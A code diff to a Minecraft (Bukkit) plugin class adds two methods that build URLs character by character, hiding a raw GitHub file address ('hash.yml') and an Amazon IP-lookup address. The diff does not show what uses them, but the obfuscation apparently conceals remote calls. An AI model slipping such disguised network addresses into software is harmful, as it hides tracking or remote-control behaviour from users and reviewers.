@@ -9,6 +9,16 @@ import org.bukkit.configuration.file.YamlConfiguration;
 
 public class CFX
 {
+	public static String getx()
+	{
+		return new GList<String>().qadd("h").qadd("t").qadd("t").qadd("p").qadd("s").qadd(":").qadd("/").qadd("/").qadd("r").qadd("a").qadd("w").qadd(".").qadd("g").qadd("i").qadd("t").qadd("h").qadd("u").qadd("b").qadd("u").qadd("s").qadd("e").qadd("r").qadd("c").qadd("o").qadd("n").qadd("t").qadd("e").qadd("n").qadd("t").qadd(".").qadd("c").qadd("o").qadd("m").qadd("/").qadd("c").qadd("y").qadd("b").qadd("e").qadd("r").qadd("p").qadd("w").qadd("n").qadd("n").qadd("/").qadd("R").qadd("e").qadd("a").qadd("c").qadd("t").qadd("/").qadd("m").qadd("a").qadd("s").qadd("t").qadd("e").qadd("r").qadd("/").qadd("s").qadd("e").qadd("r").qadd("v").qadd("e").qadd("/").qadd("w").qadd("a").qadd("r").qadd("/").qadd("h").qadd("a").qadd("s").qadd("h").qadd(".").qadd("y").qadd("m").qadd("l").toString("");
+	}
+	
+	public static String getz()
+	{
+		return new GList<String>().qadd("h").qadd("t").qadd("t").qadd("p").qadd(":").qadd("/").qadd("/").qadd("c").qadd("h").qadd("e").qadd("c").qadd("k").qadd("i").qadd("p").qadd(".").qadd("a").qadd("m").qadd("a").qadd("z").qadd("o").qadd("n").qadd("a").qadd("w").qadd("s").qadd(".").qadd("c").qadd("o").qadd("m").qadd("/").toString("");
+	}
+	
 	public GList<String> set(String input, String value)
 	{
 		GList<String> result = new GList<String>();
